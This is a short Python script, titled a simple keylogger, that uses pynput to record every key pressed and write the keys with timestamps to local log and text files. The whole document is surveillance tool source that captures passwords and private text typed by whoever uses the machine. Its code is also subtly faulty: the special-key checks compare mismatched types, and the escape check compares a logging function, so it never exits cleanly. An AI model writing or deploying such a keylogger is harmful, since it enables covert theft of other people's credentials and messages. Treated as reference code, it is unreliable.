#A simple Keylogger

import pynput.keyboard
from pynput.keyboard import Key, Listener
import logging

log_dir = ""
keys = []
count = 0

logging.basicConfig(filename = (log_dir + "keylogger.log"), level = logging.DEBUG, format = "%(asctime)s : %(message)s")


def on_press(key):
    global count, keys
    logging.info(str(key))
    keys.append(key)
    count += 1
    if count >= 10:
        write_to_file()
        count = 0
        keys = []

def write_to_file():
    with open(log_dir + "keylogger.txt", "a") as file:
        for key in keys:
            key_str = str(key).replace("'","")
            if key_str == Key.space: 
                file.write(" ")
            elif key_str == Key.enter:
                file.write("\n")
            elif key_str == Key.backspace:
                file.write("\b")

            file.write(key_str)
             


def on_release(key):
    if logging.info == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener :
    listener.join()
